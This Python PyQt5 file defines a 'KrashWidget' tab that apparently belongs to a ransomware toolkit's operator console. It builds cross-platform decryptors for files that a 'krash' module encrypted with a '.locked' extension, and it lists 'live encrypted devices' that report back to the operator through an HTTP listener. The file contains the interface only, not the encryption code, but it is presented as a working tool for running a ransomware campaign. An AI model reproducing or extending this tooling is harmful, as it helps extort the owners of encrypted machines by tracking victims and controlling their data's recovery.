import os
from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLineEdit, 
    QComboBox, QLabel, QGroupBox, QTableWidget, QTableWidgetItem, QHeaderView
)
from PyQt5.QtGui import QFont, QPixmap
from PyQt5.QtCore import Qt, pyqtSignal


class KrashWidget(QWidget):
    """KRASH/Decryptor tab widget."""
    
    build_decryptor_requested = pyqtSignal(dict)
    listener_toggle_requested = pyqtSignal()
    listener_refresh_requested = pyqtSignal()
    
    def __init__(self, script_dir, parent=None):
        super().__init__(parent)
        self.script_dir = script_dir
        self.init_ui()
        
    def init_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(15)
        
        title_font = QFont()
        title_font.setBold(True)
        title_font.setPointSize(9)
        subtitle_font = QFont()
        subtitle_font.setPointSize(9)

        # Decryptor options
        options_group = QGroupBox("DECRYPTOR")
        options_group.setFont(title_font)
        options_layout = QVBoxLayout(options_group)

        desc_label = QLabel("Build a standalone decryptor for files encrypted by the 'krash' module.\nEnsure the Key and IV match the ones used for encryption.")
        desc_label.setFont(subtitle_font)
        desc_label.setStyleSheet("color: #909090;")
        desc_label.setWordWrap(True)
        options_layout.addWidget(desc_label)
        options_layout.addSpacing(10)

        # Key
        key_layout = QHBoxLayout()
        key_label = QLabel("Key")
        key_label.setFont(subtitle_font)
        key_label.setStyleSheet("color: #b0b0b0;")
        self.key_edit = QLineEdit("0123456789abcdef0123456789abcdef")
        self.key_edit.setFont(subtitle_font)
        key_layout.addWidget(key_label)
        key_layout.addWidget(self.key_edit)
        options_layout.addLayout(key_layout)

        # IV
        iv_layout = QHBoxLayout()
        iv_label = QLabel("IV")
        iv_label.setFont(subtitle_font)
        iv_label.setStyleSheet("color: #b0b0b0;")
        self.iv_edit = QLineEdit("abcdef9876543210")
        self.iv_edit.setFont(subtitle_font)
        iv_layout.addWidget(iv_label)
        iv_layout.addWidget(self.iv_edit)
        options_layout.addLayout(iv_layout)

        # Extension
        ext_layout = QHBoxLayout()
        ext_label = QLabel("Extension")
        ext_label.setFont(subtitle_font)
        ext_label.setStyleSheet("color: #b0b0b0;")
        self.ext_edit = QLineEdit(".locked")
        self.ext_edit.setFont(subtitle_font)
        ext_layout.addWidget(ext_label)
        ext_layout.addWidget(self.ext_edit)
        options_layout.addLayout(ext_layout)

        # Build options
        build_options_layout = QHBoxLayout()
        exe_label = QLabel("EXE Name")
        exe_label.setFont(subtitle_font)
        exe_label.setStyleSheet("color: #b0b0b0;")
        self.exe_name_edit = QLineEdit("decryptor")
        
        os_label = QLabel("OS")
        os_label.setFont(subtitle_font) 
        self.os_combo = QComboBox()
        self.os_combo.addItems(["windows", "linux", "macos"])
        
        arch_label = QLabel("Processor")
        arch_label.setFont(subtitle_font)
        self.arch_combo = QComboBox()
        self.arch_combo.addItems(["amd64", "arm64"])
        
        build_options_layout.addWidget(exe_label)
        build_options_layout.addWidget(self.exe_name_edit, 1)
        build_options_layout.addWidget(os_label)
        build_options_layout.addWidget(self.os_combo, 1)
        build_options_layout.addWidget(arch_label)
        build_options_layout.addWidget(self.arch_combo, 1)
        options_layout.addLayout(build_options_layout)

        self.build_btn = QPushButton("BUILD DECRYPTOR")
        self.build_btn.setFont(subtitle_font)
        self.build_btn.clicked.connect(self.on_build_clicked)
        options_layout.addWidget(self.build_btn)

        options_layout.addStretch()
        layout.addWidget(options_group)

        # Bottom section
        bottom_section_layout = QHBoxLayout()

        # Left column - Live encrypted devices
        left_column_widget = QWidget()
        left_column_layout = QVBoxLayout(left_column_widget)
        
        devices_header_layout = QHBoxLayout()
        encrypted_devices_label = QLabel("LIVE ENCRYPTED DEVICES")
        encrypted_devices_label.setFont(title_font)
        devices_header_layout.addWidget(encrypted_devices_label)
        devices_header_layout.addStretch()
        left_column_layout.addLayout(devices_header_layout)

        live_devices_desc_label = QLabel("This panel displays a live list of devices successfully encrypted by the 'krash' module.\n"
                                         "Devices report back via HTTP server.")
        live_devices_desc_label.setFont(subtitle_font)
        live_devices_desc_label.setStyleSheet("color: #707070;")
        live_devices_desc_label.setWordWrap(True)
        left_column_layout.addWidget(live_devices_desc_label)

        listener_controls_layout = QHBoxLayout()
        self.toggle_listener_btn = QPushButton("Connect")
        self.toggle_listener_btn.setFont(subtitle_font)
        self.toggle_listener_btn.clicked.connect(self.listener_toggle_requested.emit)
        
        self.refresh_listener_btn = QPushButton("⟳ Refresh")
        self.refresh_listener_btn.setFont(subtitle_font)
        self.refresh_listener_btn.clicked.connect(self.listener_refresh_requested.emit)
        
        listener_controls_layout.addStretch()
        listener_controls_layout.addWidget(self.refresh_listener_btn)
        listener_controls_layout.addWidget(self.toggle_listener_btn)
        left_column_layout.addLayout(listener_controls_layout)

        self.encrypted_devices_table = QTableWidget()
        self.encrypted_devices_table.setColumnCount(1)
        self.encrypted_devices_table.setHorizontalHeaderLabels(["Device"])
        self.encrypted_devices_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        left_column_layout.addWidget(self.encrypted_devices_table)
        
        # Right column - Image
        image_label = QLabel()
        image_path = os.path.join(self.script_dir, "ASSETS", "unkrash.png")
        pixmap = QPixmap(image_path)
        if not pixmap.isNull():
            image_label.setPixmap(pixmap.scaled(400, 400, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        image_label.setAlignment(Qt.AlignCenter)

        bottom_section_layout.addWidget(left_column_widget, 6)
        bottom_section_layout.addWidget(image_label, 4)

        layout.addLayout(bottom_section_layout)

    def on_build_clicked(self):
        config = {
            'key': self.key_edit.text(),
            'iv': self.iv_edit.text(),
            'extension': self.ext_edit.text(),
            'exe_name': self.exe_name_edit.text(),
            'os': self.os_combo.currentText(),
            'arch': self.arch_combo.currentText()
        }
        self.build_decryptor_requested.emit(config)

    def update_device_status(self, hostname, status):
        for row in range(self.encrypted_devices_table.rowCount()):
            item = self.encrypted_devices_table.item(row, 0)
            if item and item.text() == hostname:
                if status == "Decrypted":
                    self.encrypted_devices_table.removeRow(row) 
                return
        
        if status == "Encrypted":
            row_position = self.encrypted_devices_table.rowCount()
            self.encrypted_devices_table.insertRow(row_position)
            self.encrypted_devices_table.setItem(row_position, 0, QTableWidgetItem(hostname))

    def set_listener_connected(self, is_connected):
        self.toggle_listener_btn.setText("Disconnect" if is_connected else "Connect")

    def get_settings(self):
        return {
            'key': self.key_edit.text(),
            'iv': self.iv_edit.text(),
            'extension': self.ext_edit.text(),
            'exe_name': self.exe_name_edit.text(),
            'os': self.os_combo.currentText(),
            'arch': self.arch_combo.currentText()
        }

    def load_settings(self, settings):
        self.key_edit.setText(settings.get('key', ''))
        self.iv_edit.setText(settings.get('iv', ''))
        self.ext_edit.setText(settings.get('extension', '.locked'))
        self.exe_name_edit.setText(settings.get('exe_name', 'decryptor'))
        self.os_combo.setCurrentText(settings.get('os', 'windows'))
        self.arch_combo.setCurrentText(settings.get('arch', 'amd64'))
